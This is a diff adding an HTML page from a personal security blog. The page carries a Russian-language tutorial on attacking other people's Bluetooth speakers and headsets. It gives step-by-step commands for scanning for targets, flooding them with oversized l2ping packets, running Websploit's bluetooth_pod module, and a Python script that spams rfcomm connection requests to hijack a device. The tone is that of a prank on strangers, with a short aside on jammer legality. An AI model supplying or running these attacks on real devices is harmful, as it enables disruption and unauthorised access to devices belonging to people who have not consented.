@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+	
+<!-- Basic information about this page -->
+<meta charset="UTF-8">
+<link rel="icon" type="image/x-icon" href="/assets/img/fav.ico">
+<title>
+	
+		Взлом Bluetooth ::
+	
+	Rucker :: Security Researcher
+</title>
+
+<!-- Meta tag looking for mobile devices -->
+<meta name="viewport" content="initial-scale=1.5">
+<meta name="theme-color" content="#232323">
+
+<!-- Good information about this page -->
+<meta name="description" content="Security Researcher">
+<meta name="keywords" content="Security, Hacking">
+<meta name="author" content="Rucker">
+
+<!-- Style and scripts files -->
+<link rel="stylesheet" type="text/css" href="/assets/css/style.css">
+
+<!-- Extra information about this page -->
+<link rel="license" type="text/plain" src="/assets/LICENSE">
+
+<!-- Facebook, Linkedin, Reddit and many others Open Graph -->
+<meta property="og:site_name" content="Rucker" />
+<meta property="og:title" content="Rucker :: Security Researcher" />
+<meta property="og:type" content="website" />
+<meta property="og:description" content="Security Researcher" />
+<meta property="og:url" content="https://ruuucker.github.io" />
+<meta property="og:image:type" content="image/png" /> <!-- less than 5mB -->
+<meta property="og:image:width" content="600" />
+<meta property="og:image:height" content="315" />
+<meta property="og:image" content="/assets/img/cover.svg" />
+<meta property="og:locale" content="en" />
+<meta property="og:locale:alternate" content="ru_RU" />
+<meta property="fb:page_id" content="688484114615664" />
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Rucker :: Security Researcher" />
+<meta name="twitter:description" content="Security Researcher" />
+<meta name="twitter:url" content="https://ruuucker.github.io" />
+<meta name="twitter:image" content="/assets/img/cover.svg" />
+<meta name="twitter:author" content="" />
+
+<!-- Linkedin OGP cards -->
+<meta property="og:image" content="/assets/img/cover.svg" />
+<meta property="og:image:width" content="180" />
+<meta property="og:image:height" content="110" />
+
+<!-- Google+ OGP cards -->
+<meta itemprop="name" content="Rucker :: Security Researcher" />
+<meta itemprop="author" content="" />
+<meta itemprop="description" content="Security Researcher" />
+<meta itemprop="image" content="/assets/img/cover.svg" />
+
+
+<script type="text/javascript">
+	if (window.location.protocol != "https:")
+		window.location.href = "https:" + window.location.href.substring(window.location.protocol.length);
+</script>
+
+	<body>
+		<header>
+	<pre class="ascii name">
+      ___           ___           ___           ___           ___           ___     
+     /\  \         /\__\         /\  \         /\__\         /\  \         /\  \    
+    /::\  \       /:/  /        /::\  \       /:/  /        /::\  \       /::\  \   
+   /:/\:\  \     /:/  /        /:/\:\  \     /:/__/        /:/\:\  \     /:/\:\  \  
+  /::\~\:\  \   /:/  /  ___   /:/  \:\  \   /::\__\____   /::\~\:\  \   /::\~\:\  \ 
+ /:/\:\ \:\__\ /:/__/  /\__\ /:/__/ \:\__\ /:/\:::::\__\ /:/\:\ \:\__\ /:/\:\ \:\__\
+ \/_|::\/:/  / \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~    \:\~\:\ \/__/ \/_|::\/:/  /
+    |:|::/  /   \:\  /:/  /   \:\  \          |:|  |      \:\ \:\__\      |:|::/  / 
+    |:|\/__/     \:\/:/  /     \:\  \         |:|  |       \:\ \/__/      |:|\/__/  
+    |:|  |        \::/  /       \:\__\        |:|  |        \:\__\        |:|  |    
+     \|__|         \/__/         \/__/         \|__|         \/__/         \|__|    
+       
+</pre>
+</header>
+
+      	
+		 	<nav>
+	<ul>
+		<li><a href="/ru/#">Главная</a></li>
+      		<li><a href="/ru/#articles">Статьи</a></li>
+		<!-- <li><a href="/ru/#methods">Методологии</a></li> --!>
+		<li><a href="/ru/#cheatsheets">Чит щит</a></li>
+     	 	<li><a href="/ru/#tools">Тулзы</a></li>
+    	  	<li><a href="/ru/#contact">Ссылки</a></li>
+  	    <li><a href="/../">Eng</a></li>
+	</ul>
+</nav>
+
+      	
+		<main>
+			<br>
+<header>
+	<h1>Взлом Bluetooth</h1>
+</header>
+
+<h1>Внимание, информация нагло спизжена у Ghoustchat с ][akepa</h1>
+
+<h1 class="no_toc" id="оглавление">Оглавление</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#введение" id="markdown-toc-введение">Введение</a></li>
+  <li><a href="#теперь-по-порядку" id="markdown-toc-теперь-по-порядку">Теперь по порядку.</a></li>
+  <li><a href="#первый-способ-l2ping" id="markdown-toc-первый-способ-l2ping">Первый способ: l2ping</a></li>
+  <li><a href="#второй-способ-websploit" id="markdown-toc-второй-способ-websploit">Второй способ: Websploit</a></li>
+  <li><a href="#про-готовые-джаммеры" id="markdown-toc-про-готовые-джаммеры">Про готовые джаммеры</a></li>
+  <li><a href="#подключаемся-к-чужому-девайсу" id="markdown-toc-подключаемся-к-чужому-девайсу">Подключаемся к чужому девайсу</a></li>
+</ul>
+
+<h1 id="введение">Введение</h1>
+
+<p>Если современные Wi-Fi-роутеры способны фильтровать нежелательные пакеты, то большинство адаптеров Bluetooth, мягко говоря, туповаты. Им по большому счету безразлично, какой пакет и какого объема, а уж тем более сколько этих пакетов ты пришлешь. Поэтому нам не составляет абсолютно никакого труда увеличить в Linux информационный объем пакета ping до огромного значения, а потом отослать этих пакетов на девайс с Bluetooth, скажем, 1000 штук.</p>
+
+<h1 id="теперь-по-порядку">Теперь по порядку.</h1>
+<p>Для начала нам нужно найти подходящие устройства в зоне досягаемости. Для этого используем команду</p>
+
+<p>$ hcitool scan
+В результате этой нехитрой манипуляции ты получишь список доступных устройств с Bluetooth с их MAC-адреса. Если твоя система не видит адаптер Bluetooth, то я рекомендую поставить один из менеджеров Bluetooth для Linux. В Kali лично мне подошел gnome-bluetooth, который можно установить следующей командой:</p>
+
+<p>$ apt-get install gnome-bluetooth
+Еще можно воспользоваться утилитой blueman:</p>
+
+<p>$ apt-get install blueman
+Получив список потенциальных жертв, можно расправиться с их синезубыми девайсами несколькими способами. Рассмотрим каждый по отдельности.</p>
+
+<h1 id="первый-способ-l2ping">Первый способ: l2ping</h1>
+<p>Воспользуемся такой командой:</p>
+
+<p>$ l2ping -i hci0 -s <packet value=""> -f <MAC_address>
+Она сгенерирует пакеты указанного тобой в параметре</MAC_address></packet></p>
+
+<p>&lt;packet value&gt;
+объема и будет отсылать эти пакеты на MAC-адрес, записанный в качестве параметра
+&lt;MAC_address&gt;
+. В конце концов ты увидишь такую картину: в терминале время отклика будет постепенно увеличиваться, а на атакуемом устройстве, скорее всего, просто отключится Bluetooth. Через какое-то время он все равно включится, но музыка прервется, и некоторое удовлетворение будет получено.</p>
+
+<p>INFO
+Такая схема очень хорошо работает, когда атакуемое устройство (к примеру, телефон) подключено к гарнитуре или колонке по Bluetooth. После атаки эти два устройства не смогут соединиться друг с другом.</p>
+
+<h1 id="второй-способ-websploit">Второй способ: Websploit</h1>
+<p>Существует более элегантный и удобный способ заглушить колонку, из которой доносятся жизнерадостные звуки рэпа. Запускаем утилиту Websploit:</p>
+
+<p>$ websploit
+Набираем в консоли команду</p>
+
+<p>$ show modules
+Она продемонстрирует нам все модули, которые работают с этой утилитой. Там есть множество компонентов, работающих с Wi-Fi, но нас интересует конкретно модуль bluetooth/bluetooth_pod:</p>
+
+<p>$ use bluetooth/bluetooth_pod
+Теперь нужно настроить все параметры и указать сведения об атакуемом устройстве:</p>
+
+<p>$ show options
+$ set bdaddr <MAC_address>
+Чтобы точно и наверняка угробить Bluetooth, мы изменим размер отсылаемого пакета:</MAC_address></p>
+
+<p>$ set size 999
+Все подготовительные действия завершены, можем запускать нашу «машину для убийств»:</p>
+
+<p>$ run
+На выходе мы увидим абсолютно похожую картину: пинги становятся дольше, а музыка прерывается. Красота!</p>
+
+<p>Эти два способа будут работать практически с любыми блютусными колонками, гарнитурами и прочими похожими устройствами. Просто потому, что производители не выпускают для них новые прошивки, способные фильтровать входящие пакеты. Так что, если у тебя есть ноутбук с «Линуксом» на борту, ты точно можешь назвать себя грозой портативных колонок.</p>
+
+<p>Если колонка справляется с атакой, можно попробовать отправить пакеты на сам телефон, к которому она подключена. Лично я тестировал этот метод на довольно мощной портативной колонке (JBL Xtreme), и она более-менее справлялась с нагрузкой. Но дешевые китайские поделки такая атака вырубает на раз.</p>
+
+<h1 id="про-готовые-джаммеры">Про готовые джаммеры</h1>
+<p>В интернете продаются любопытные товары, среди которых можно найти и глушилки частот. Стоят они обычно приличных денег и предоставляют разные возможности. Одни могут валить практически все сигналы мобильной сети, Wi-Fi и Bluetooth разом, а другие не справятся и с H+.</p>
+
+<p>Если ты считаешь, что тебе действительно необходим подобный товар, то перед его приобретением настоятельно рекомендую ознакомиться с действующим законодательством. В России покупать и продавать глушилки не запрещено, однако если ты решишь воспользоваться ей, то необходима регистрация устройства в ГКРЧ. Если тебя поймают на использовании незарегистрированного девайса, то, скорее всего, оштрафуют по статье 13.4 КоАП РФ. Штраф для физических лиц на сегодняшний день составляет 500 рублей, для юридических — до 10 тысяч.</p>
+
+<h1 id="подключаемся-к-чужому-девайсу">Подключаемся к чужому девайсу</h1>
+<p>Как мы уже знаем, примитивные колонки и гарнитуры почти никогда не фильтруют пакеты, которые мы им отправляем. Но что будет, если отослать такому девайсу не просто пакет с данными для проверки связи (ping), а пакет с запросом на подключение к устройству? И не один.</p>
+
+<p>Не все производители подобных гарнитур позаботились о защите от переполнения буфера. Если все пакеты становятся в очередь, то что произойдет, когда складировать запросы уже будет некуда? Колонка попытается выполнить команду и при этом очистить буфер.</p>
+
+<p>Поэтому мы используем стандартный протокол обмена данными по Вluetooth — rfcomm. Но так как сама утилита, контролирующая протокол, не позволит нам отправить тысячу таких запросов, мы напишем небольшой скрипт на Python, который автоматизирует процесс.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python
+import subprocess
+
+cmd=['rfcomm', 'connect', '&lt;MAC_address&gt;', '1']
+
+for i in range(0, 1001):
+subprocess.call(cmd)
+print('Connecting...')
+</code></pre></div></div>
+
+<p>Перед запуском скрипта нам нужно узнать MAC-адрес устройства. Для этого используем уже знакомую команду</p>
+
+<p>hcitool scan
+, а полученный адрес вставляем в скрипт вместо</p>
+<MAC_address>
+. Теперь сохраняем скрипт и запускаем его:
+$ python <FileName>
+Сработает скрипт или нет, зависит от модели атакуемого девайса, вернее, от скорости заполнения буфера. Если буфер успеет забиться до его очистки, то команда будет выполнена, и тогда мы подключимся к колонке одновременно с основным пользователем. Если же буфер очистится, то ничего не получится и придется перезапустить скрипт.
+</FileName></MAC_address>
+
+
+		</main>
+	</body>
+</html>
